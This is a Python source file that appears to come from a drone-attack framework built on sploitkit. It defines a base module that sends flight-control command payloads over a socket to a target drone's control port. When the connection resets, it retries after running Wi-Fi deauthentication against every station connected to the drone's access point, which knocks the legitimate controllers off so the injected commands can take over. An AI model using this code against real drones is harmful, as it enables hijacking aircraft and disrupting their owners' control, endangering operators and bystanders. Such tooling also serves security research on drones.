# -*- coding: UTF-8 -*-
import ast
import socket
from sploitkit import Module
from time import sleep

from lib.wifi import DeauthMixin


class DroneModule(Module, DeauthMixin):
    """ Generic Module proxy class for defining multiple common utility methods
         for drones. """
    def preload(self):
        if 'TARGET' not in self.config.keys():
            raise NotImplementedError("DroneModule must have a TARGET option")
        targets = self.config.option('TARGET').choices
        if len(targets) == 0:
            self.logger.warning("No {} target connected yet ; please use the "
                                "'scan' and 'connect' commands"
                                .format(self.drone))
            return False
        self.config['TARGET'] = targets[0]
    
    def prerun(self):
        ip = self.config.option("IP").value
        if self.console._jobs.call("ping -c 2 {} -w 3".format(ip)) != 0:
            self.logger.warning("Target seems to be down")
            return False
    
    def send_command(self, *args, **kwargs):
        self._last_cmd_resp = None
        sock_type = getattr(self, 'sock_type', socket.SOCK_STREAM)
        s = socket.socket(socket.AF_INET, sock_type)
        s.settimeout(kwargs.pop('timeout', 10))
        success = False
        try:
            payload = getattr(self, 'payload_format', "") % args
        except Exception as e:
            self.logger.error("Bad command payload format ({})".format(e))
            return False
        try:
            s.connect((self.config.option("IP").value,
                       self.config.option("FLYCTL_PORT").value))
            self.logger.debug("Send: " + payload)
            s.send(payload.encode())
            r = s.recv(1024).strip(b" \x00").decode()
            self.logger.debug("Recv: {}".format(r or "empty response"))
            if len(r) > 0:
                self._last_cmd_resp = r = ast.literal_eval(r)
                success = r.get('RESULT') == 0
                if not success:
                    self.logger.failure("Command failed")
                return success
            else:
                self._last_cmd_resp = {}
                raise ConnectionResetError("Empty response")
        except ConnectionResetError:
            kwargs['retry'] = kwargs.get('retry', 5)
            kwargs['deauth'] = kwargs.get('deauth', 3)
        except Exception as e:
            self.logger.failure("Command failed ({})".format(e))
        finally:
            s.close()
        if kwargs.get('retry', 0) > 0:
            if kwargs.get('deauth', 0) > 0:
                essid = self.config.option('TARGET').value
                t = self.console.state['TARGETS'][essid]
                bssid = t['bssid']
                for sta in t['stations']:
                    self.deauth(bssid, sta, 5, .5, 2, silent=True)
            sleep(.1)
            kwargs['retry'] -= 1
            kwargs['deauth'] -= 1
            return self.send_command(*args, **kwargs)
